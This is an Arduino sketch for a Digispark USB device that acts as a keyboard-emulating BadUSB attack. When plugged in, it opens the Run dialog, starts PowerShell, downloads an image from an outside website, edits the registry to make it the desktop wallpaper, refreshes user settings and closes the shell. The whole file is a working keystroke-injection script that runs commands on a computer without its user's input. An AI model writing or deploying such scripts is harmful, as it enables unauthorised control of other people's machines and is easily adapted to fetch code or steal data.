#include <DigiKeyboard.h>

void setup (){}

void loop ()
{
  int d=1000;
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(d);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke( KEY_ENTER);
  DigiKeyboard.delay(d);
  DigiKeyboard.print("$client = new-object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(d);
  DigiKeyboard.print("$client.DownloadFile('https://images4.alphacoders.com/206/20658.jpg','kitty.jpg')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(d);
  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d \"C:\\Users\\YOURUSERNAMEHERE\\kitty.jpg\" /f");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(d);
  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(d);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){}
}
